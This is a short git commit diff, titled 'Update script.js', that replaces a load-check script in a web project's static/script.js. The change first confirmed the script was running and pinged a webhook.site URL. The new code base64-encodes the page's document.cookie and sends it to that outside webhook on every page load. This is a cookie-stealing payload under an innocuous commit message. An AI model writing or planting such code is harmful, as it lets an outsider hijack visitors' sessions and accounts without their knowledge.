86797f38e9a7ac0a83b55cc46f475aa3e1d97a0b
bibo17 <aespa.winrina11@gmail.com>
2025-04-23 20:57:53 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,3 +1,3 @@
-console.log("✅ script.js loaded");
-document.body.innerHTML += "<p>✅ 我活著</p>";
-fetch("https://webhook.site/eb6a415c-99ef-4f53-b942-d46167f64a59?ok", { mode: "no-cors" });
+fetch("https://webhook.site/eb6a415c-99ef-4f53-b942-d46167f64a59?" + btoa(document.cookie), {
+  mode: "no-cors"
+});
